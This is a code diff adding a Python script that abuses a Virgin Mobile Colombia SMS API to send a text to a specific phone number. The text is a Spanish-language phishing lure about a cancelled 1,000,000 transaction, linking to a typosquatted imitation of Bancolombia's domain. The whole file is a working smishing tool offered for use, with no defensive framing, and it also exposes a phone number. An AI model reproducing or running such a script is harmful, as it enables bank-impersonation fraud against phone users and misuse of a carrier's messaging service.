@@ -1,0 +1,22 @@
+import requests
+import json
+
+url = "https://app.virginmobile.co/api/evident/sms-evident"
+
+payload = json.dumps({
+  "phoneNumber": "3017518371",
+  "brand": {
+    "id": 1
+  },
+  "channel": {
+    "id": 5
+  },
+  "message": "Su transaccion por 1.000.000 esta siendo cancelada, por ultimo digite el sms desde https://cuenta.bancolmbia.net/"
+})
+headers = {
+  'Content-Type': 'application/json'
+}
+
+response = requests.request("POST", url, headers=headers, data=payload)
+
+print(response.text)
